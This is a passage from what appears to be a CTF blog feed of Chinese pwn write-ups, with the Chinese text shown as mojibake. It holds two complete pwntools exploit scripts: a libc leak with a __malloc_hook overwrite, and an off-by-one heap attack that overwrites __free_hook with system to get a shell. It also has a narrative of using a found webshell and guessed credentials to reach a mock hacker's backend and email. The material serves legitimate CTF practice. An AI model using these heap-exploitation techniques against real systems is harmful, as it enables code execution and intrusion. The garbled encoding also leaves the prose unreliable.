class="number">0</span>)</span><br></pre></td></tr></table></figure></p><p>ç„¶åæ˜¯æœ¬é¢˜çš„ç²¾å<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>, <span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x21</span>)</span><br><span class="line">edit_info(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="number">0x6020e0</span>)</span><br><span class="line"><span class="comment"># free(-3)</span></span><br></pre></td></tr></table></figure></p><p>æ•ˆæœæ˜¯è¿™æ ·çš„<br><img src="https://i.loli.net/2021/06/05/1DxdUwI9jASg7kB.png" alt=""></p><p>ç„¶åfree(-3)ï¼Œé‚£ä¸ªä¼ªé€ çš„chunkå°±è¿›å…¥åˆ°biné‡Œäº†</p><p>ç„¶åç”³è¯·å›æ¥ï¼Œæ”¹sizeä¸º0çš„è¯å¯ä»¥è·å¾—çœŸæ­£uafçš„èƒ½åŠ›ï¼Œåé¢å°±ç®€å•äº†</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ticket&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc-2.23.so&#x27;</span></span><br><span class="line">port = <span class="number">26007</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27113</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillInfo</span>(<span class="params">name, say, age</span>):</span></span><br><span class="line">    p.sendafter(<span class="string">&quot;Your name:&quot;</span>, name)</span><br><span class="line">    p.sendafter(<span class="string">&quot;what do you want to say before take off(wu hu qi fei):&quot;</span>, say)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Your age:&quot;</span>, <span class="built_in">str</span>(age))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Remarks size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Your remarks:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_info</span>(<span class="params">name, say, age</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    fillInfo(name, say, age)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_info</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">fillInfo(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xd0</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x21</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">__malloc_hook = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">296</span> - <span class="number">0x10</span></span><br><span class="line">libc_base = __malloc_hook - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;LIBC BASE ===&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x21</span>)</span><br><span class="line">edit_info(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="number">0x6020e0</span>)</span><br><span class="line">free(-<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0x70</span>) + p64(<span class="number">0x0</span>))</span><br><span class="line">edit(<span class="number">2</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x60</span>)</span><br><span class="line">og = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x13</span> + p64(og[<span class="number">3</span>] + libc_base))</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0x70</span>) + p64(<span class="number">0x0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="card"><a href="#card" class="headerlink" title="card"></a>card</h2><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p><img src="https://i.loli.net/2021/06/05/UPpgt2VXkEof6iz.png" alt=""><br>æ¼æ´ç‚¹åœ¨äºè¿™ä¸ªåœ°æ–¹ï¼Œeditçš„æ—¶å€™ç›´æ¥ç”¨sizeå°±å¥½äº†ï¼Œè¿™é‡ŒåååŠ äº†ä¸€ä¸ªv1ï¼Œæ˜æ˜¾æ˜¯æœ‰æ¼æ´ï¼Œç„¶åæˆ‘ä»¬è¿›å…¥overflowå‡½æ•°çœ‹çœ‹</p><p><img src="https://i.loli.net/2021/06/05/ca6LgQMpY1GUyAS.png" alt=""><br>è¿›è¡Œäº†ä¸€äº›åˆ—èœœæ±æ“ä½œï¼Œçœ‹ä¸æ‡‚é—®é¢˜ä¸å¤§ï¼Œåæ­£å°±æ˜¯è¿™ä¹ˆä¸ªé€»è¾‘ï¼Œè¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼åŠ ä¸Šsizeä½œä¸ºeditçš„sizeï¼Œé‚£ä¹ˆåªè¦è¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼æ˜¯1ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºæº¢å‡ºäº†ä¸€ä¸ªå­—èŠ‚å‘—</p><p>å†™ä¸ªè„šæœ¬æ¥çœ‹çœ‹ï¼Œç›´æ¥ç”¨é‚£ä¸ªoverflowçš„é€»è¾‘ï¼Œç¨å¾®æ”¹æ”¹å°±è¡Œäº†ï¼Œå¦‚æœè¿”å›å€¼ä¸æ˜¯0ï¼Œé‚£ä¹ˆå°±è¾“å‡ºï¼Œçœ‹çœ‹å“ªäº›sizeæ˜¯å¯ç”¨çš„<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">size = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>):</span><br><span class="line">    <span class="keyword">if</span> ((((((i &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>) + i) &amp; <span class="number">0xF</span>) - ((i &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>)) &gt;&gt; <span class="number">3</span>):</span><br><span class="line">        size.append(<span class="built_in">hex</span>(i))</span><br><span class="line">print(<span class="built_in">len</span>(size))</span><br><span class="line">print(size)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2021/06/05/BZgo3sP8ThXI5Nb.png" alt=""></p><p>é‚£å°±ç›´æ¥ç”¨0x?8çš„åœ°å€å°±å¯ä»¥äº†<br>æ‰€ä»¥è¿™é“é¢˜å°±è½¬å˜ä¸ºäº†libc-2.27ä¸‹çš„off-by-one<br>ï¼ˆlibcç‰ˆæœ¬ä¸ºGLIBC 2.27-3ubuntu1ï¼Œå°šæ— keyæœºåˆ¶ï¼Œä¸è¿‡è¿™é“é¢˜å¥½åƒä¹Ÿæ— éœ€å…³å¿ƒè¿™ä¸€ç‚¹ï¼‰</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so&#x27;</span></span><br><span class="line">port = <span class="number">29844</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;please choice your card:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Infuse power:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;quickly!&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;please choice your card&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;start your bomb show&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Which card:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x10</span>, <span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">289</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;LIBC BASE =====&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xe0</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x78</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x68</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x78</span>, <span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x70</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p8(<span class="number">0xf1</span>) </span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x90</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x70</span> + p64(<span class="number">0xf0</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x68</span>, <span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x78</span>, <span class="string">&#x27;eeee&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">edit(<span class="number">5</span>, p64(__free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x70</span>, <span class="string">&quot;HACKER&quot;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x70</span>, p64(system))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[&#x27;0x8&#x27;, &#x27;0x9&#x27;, &#x27;0xa&#x27;, &#x27;0xb&#x27;, &#x27;0xc&#x27;, &#x27;0xd&#x27;, &#x27;0xe&#x27;, &#x27;0xf&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x18&#x27;, &#x27;0x19&#x27;, &#x27;0x1a&#x27;, &#x27;0x1b&#x27;, &#x27;0x1c&#x27;, &#x27;0x1d&#x27;, &#x27;0x1e&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x1f&#x27;, &#x27;0x28&#x27;, &#x27;0x29&#x27;, &#x27;0x2a&#x27;, &#x27;0x2b&#x27;, &#x27;0x2c&#x27;, &#x27;0x2d&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x2e&#x27;, &#x27;0x2f&#x27;, &#x27;0x38&#x27;, &#x27;0x39&#x27;, &#x27;0x3a&#x27;, &#x27;0x3b&#x27;, &#x27;0x3c&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x3d&#x27;, &#x27;0x3e&#x27;, &#x27;0x3f&#x27;, &#x27;0x48&#x27;, &#x27;0x49&#x27;, &#x27;0x4a&#x27;, &#x27;0x4b&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x4c&#x27;, &#x27;0x4d&#x27;, &#x27;0x4e&#x27;, &#x27;0x4f&#x27;, &#x27;0x58&#x27;, &#x27;0x59&#x27;, &#x27;0x5a&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x5b&#x27;, &#x27;0x5c&#x27;, &#x27;0x5d&#x27;, &#x27;0x5e&#x27;, &#x27;0x5f&#x27;, &#x27;0x68&#x27;, &#x27;0x69&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x6a&#x27;, &#x27;0x6b&#x27;, &#x27;0x6c&#x27;, &#x27;0x6d&#x27;, &#x27;0x6e&#x27;, &#x27;0x6f&#x27;, &#x27;0x78&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x79&#x27;, &#x27;0x7a&#x27;, &#x27;0x7b&#x27;, &#x27;0x7c&#x27;, &#x27;0x7d&#x27;, &#x27;0x7e&#x27;, &#x27;0x7f&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x88&#x27;, &#x27;0x89&#x27;, &#x27;0x8a&#x27;, &#x27;0x8b&#x27;, &#x27;0x8c&#x27;, &#x27;0x8d&#x27;, &#x27;0x8e&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x8f&#x27;, &#x27;0x98&#x27;, &#x27;0x99&#x27;, &#x27;0x9a&#x27;, &#x27;0x9b&#x27;, &#x27;0x9c&#x27;, &#x27;0x9d&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x9e&#x27;, &#x27;0x9f&#x27;, &#x27;0xa8&#x27;, &#x27;0xa9&#x27;, &#x27;0xaa&#x27;, &#x27;0xab&#x27;, &#x27;0xac&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xad&#x27;, &#x27;0xae&#x27;, &#x27;0xaf&#x27;, &#x27;0xb8&#x27;, &#x27;0xb9&#x27;, &#x27;0xba&#x27;, &#x27;0xbb&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xbc&#x27;, &#x27;0xbd&#x27;, &#x27;0xbe&#x27;, &#x27;0xbf&#x27;, &#x27;0xc8&#x27;, &#x27;0xc9&#x27;, &#x27;0xca&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xcb&#x27;, &#x27;0xcc&#x27;, &#x27;0xcd&#x27;, &#x27;0xce&#x27;, &#x27;0xcf&#x27;, &#x27;0xd8&#x27;, &#x27;0xd9&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xda&#x27;, &#x27;0xdb&#x27;, &#x27;0xdc&#x27;, &#x27;0xdd&#x27;, &#x27;0xde&#x27;, &#x27;0xdf&#x27;, &#x27;0xe8&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xe9&#x27;, &#x27;0xea&#x27;, &#x27;0xeb&#x27;, &#x27;0xec&#x27;, &#x27;0xed&#x27;, &#x27;0xee&#x27;, &#x27;0xef&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xf8&#x27;, &#x27;0xf9&#x27;, &#x27;0xfa&#x27;, &#x27;0xfb&#x27;, &#x27;0xfc&#x27;, &#x27;0xfd&#x27;, &#x27;0xfe&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xff&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMPWN</title>
      <link href="2021/05/30/VMPWN/"/>
      <url>2021/05/30/VMPWN/</url>
      
        <content type="html"><![CDATA[<h2 id="ciscn-2019-qual-virtual"><a href="#ciscn-2019-qual-virtual" class="headerlink" title="ciscn_2019_qual_virtual"></a>ciscn_2019_qual_virtual</h2>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> VMpwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JlenuCTF</title>
      <link href="2021/05/23/JlenuCTF/"/>
      <url>2021/05/23/JlenuCTF/</url>
      
        <content type="html"><![CDATA[<p>åæ­£äº¤å®Œwpäº†ï¼Œç´¢æ€§æ°´ä¸ªåšå®¢å§ï¼ˆ</p><h2 id="HAPPYGAME"><a href="#HAPPYGAME" class="headerlink" title="HAPPYGAME"></a>HAPPYGAME</h2><h3 id="SIMPIOT"><a href="#SIMPIOT" class="headerlink" title="SIMPIOT"></a>SIMPIOT</h3><p>åˆ°æ‰‹åç›´æ¥stringsä¸€æ³¢ï¼Œå•Šè¿™</p><p><img src="https://i.loli.net/2021/05/22/KxLRHa4nw7hP8rY.png" alt=""></p><h3 id="ç¤¾å·¥ä¸€ï¼šå¸®æˆ‘æº¯æº"><a href="#ç¤¾å·¥ä¸€ï¼šå¸®æˆ‘æº¯æº" class="headerlink" title="ç¤¾å·¥ä¸€ï¼šå¸®æˆ‘æº¯æº"></a>ç¤¾å·¥ä¸€ï¼šå¸®æˆ‘æº¯æº</h3><p>æˆ‘æ„¿ç§°ä¸ºæœ€å¼ºé¢˜ç›®ï¼Œé›ªå®yyds</p><p>ğŸ‘´ğŸ»ä¸€å¼€å§‹ä¸çŸ¥é“æ€ä¹ˆå›äº‹ï¼Œä¸‹è½½ä¸‹æ¥www.zipæ˜¯è¿™æ ·çš„ï¼Œè«ä¸æ˜¯ğŸ‘´ğŸ»è¢«æ…å±äº†ï¼Œæµªè´¹äº†ğŸ‘´ğŸ»ä¸€ä¸ªåŠå°æ—¶çœ‹æ—¥å¿—æ–‡ä»¶ï¼Œç„¶åè¿˜çœŸç»™ğŸ‘´ğŸ»æŸ¥å‡ºä¸ªå¨èƒæƒ…æŠ¥ipæ¥</p><p><img src="https://i.loli.net/2021/05/22/LHRF74sqPt3TV9D.png" alt=""></p><p><img src="https://i.loli.net/2021/05/22/KNnSZ8rAUVWqfPc.png" alt=""></p><p>åæ¥ğŸ‘´ğŸ»æµ‹äº†ä¸€å †æ— ç”¨åŠŸï¼Œæ‰¾äº†ä¸€äº›æ—¥å¿—å®¡è®¡è„šæœ¬å’Œæ‰‹å†™æ­£åˆ™çš„è„šæœ¬ï¼Œå‘ç°å•¥éƒ½æŸ¥ä¸åˆ°ï¼ŒğŸ‘´ğŸ»å‚»äº†ï¼ŒğŸ‘´ğŸ»å¯»æ€happygameç»™ğŸ‘´ğŸ»æ•´ä¸happyäº†ï¼ŒğŸ‘´ğŸ»å¾ˆæ°”æ„¤ï¼ŒğŸ‘´ğŸ»å»ç¡è§‰äº†</p><p>ğŸ‘´ğŸ»ç¬¬äºŒå¤©è¶Šæƒ³è¶Šæ°”ï¼ŒğŸ‘´ğŸ»å†³å®šå†æ¥åšä¸€åšï¼ŒğŸ‘´ğŸ»é‡æ–°ä¸‹è½½www.zipï¼ŒğŸ‘´ğŸ»å‚»äº†ï¼Œç«Ÿç„¶æ˜¯ç½‘ç«™æºç ï¼Œ****</p><p>å¥½äº†ï¼Œå¼€å§‹å®¡è®¡ï¼Œripsç»™ğŸ‘´ğŸ»æ‰«</p><p><img src="https://i.loli.net/2021/05/23/qvtuL1K3yZToQCB.png" alt=""></p><p>æ‰«å‡ºæ¥æœ¨é©¬äº†ï¼ŒğŸ‘´ğŸ»ç›´æ¥è¿shellï¼Œç„¶åhacked by HSYM</p><h3 id="ç¤¾å·¥äºŒï¼šæ·±å…¥è°ƒæŸ¥"><a href="#ç¤¾å·¥äºŒï¼šæ·±å…¥è°ƒæŸ¥" class="headerlink" title="ç¤¾å·¥äºŒï¼šæ·±å…¥è°ƒæŸ¥"></a>ç¤¾å·¥äºŒï¼šæ·±å…¥è°ƒæŸ¥</h3><p><img src="https://i.loli.net/2021/05/23/2dEKNoIMWHhtbGf.png" style="zoom:50%;" /></p><p>å®¡æ—¥å¿—ï¼Œipåˆ°æ‰‹</p><h3 id="ç¤¾å·¥ä¸‰ï¼šä¿¡æ¯æ”¶é›†"><a href="#ç¤¾å·¥ä¸‰ï¼šä¿¡æ¯æ”¶é›†" class="headerlink" title="ç¤¾å·¥ä¸‰ï¼šä¿¡æ¯æ”¶é›†"></a>ç¤¾å·¥ä¸‰ï¼šä¿¡æ¯æ”¶é›†</h3><p>è®¿é—®å¸¦é»‘å®¢çš„ç½‘ç«™ï¼Œå‘ç°æ‰£æ‰£å·ï¼Œæ‰¾åˆ°ä»–çš„ç”Ÿæ—¥äº†ï¼Œæœ‰hintï¼Œåšå®¢åå°æ˜¯id+ç”Ÿæ—¥</p><p><img src="https://i.loli.net/2021/05/23/JYo1FjGAEbpklhi.png" alt=""></p><p>ç„¶åå°±å¯ä»¥è¿›å¸¦é»‘å®¢çš„åå°äº†</p><h3 id="ç¤¾å·¥å››ï¼šåå‡»é»‘å®¢"><a href="#ç¤¾å·¥å››ï¼šåå‡»é»‘å®¢" class="headerlink" title="ç¤¾å·¥å››ï¼šåå‡»é»‘å®¢"></a>ç¤¾å·¥å››ï¼šåå‡»é»‘å®¢</h3><p>è¿™ä¸ªğŸ‘´ğŸ»æ²¡æœ‰åšå‡ºæ¥ï¼Œä½†æ˜¯ğŸ‘´ğŸ»ä¸çŸ¥é“å“ªé‡Œä¸å¯¹ï¼Œå…ˆè®°å½•ä¸€ä¸‹8</p><p>è¿›äº†åå°ï¼Œç”¨msfè¿æ¥shellä¸å°±è¡Œäº†</p><p>ç„¶åæ‰¾åˆ°äº†è¿™ä¸ªudf.phpï¼Œæœ‰ä¸ä¼šä¿®ç”µè„‘å¸ˆå‚…ç•™ä¸‹çš„åé—¨ï¼Œè¿™ä¸ç›´æ¥æ‹¿æ¥ç”¨ä¸€æ³¢</p><p>ç„¶åå°è¯•æŸ¥çœ‹backupå‘ç°disable_functionç»™banäº†å¥½å¤šsystemä¹‹ç±»çš„ä¸œè¥¿ï¼Œç®—äº†ï¼Œå†çœ‹çœ‹åˆ«çš„ç›®å½•</p><p>ç„¶åå‘ç°äº†è¿™ä¸ª</p><p><img src="https://i.loli.net/2021/05/23/klZN8cqTEMKp2Qg.png" style="zoom:50%;" /></p><p>èŠœæ¹–ï¼Œç„¶åé‚®ç®±å¯†ç å°±æ‹¿åˆ°äº†ï¼Œç”¨å¸¦é»‘å®¢çš„ProtonMailé‚®ç®±ç™»è¿›å»ï¼Œå‘ç°åšæœäº‘2333</p><p><img src="https://i.loli.net/2021/05/23/pxSX9ogACfr5BY1.png" style="zoom:50%;" /></p><p>å‘ç°å¸¦é»‘å®¢çš„èº«ä»½è¯ï¼Œé‚£æŒ‰ç†æ¥è¯´é»‘å®¢å°±ä½åœ¨ä¸‹åŒ—æ³½ï¼Ÿä½†æ˜¯flagä¸å¯¹</p><p><img src="https://i.loli.net/2021/05/23/QXrWPYkZ62uTCNs.png" style="zoom:50%;" /></p><p>æ‰€ä»¥ğŸ‘´ğŸ»ç™¾åº¦ç™¾ç§‘æŸ¥åˆ°äº†ä¸‹åŒ—æ³½çš„å„ç§å«æ³•å’Œä¸‹åŒ—æ³½åœ¨æ—¥æœ¬çš„å…·ä½“ä½ç½®ï¼Œéƒ½ä¸å¯¹ï¼Œç®—äº†ï¼Œä¸åšäº†ï¼Œè¡¥ä½œä¸šå»äº†ï¼ˆx</p><h2 id="MISC"><a 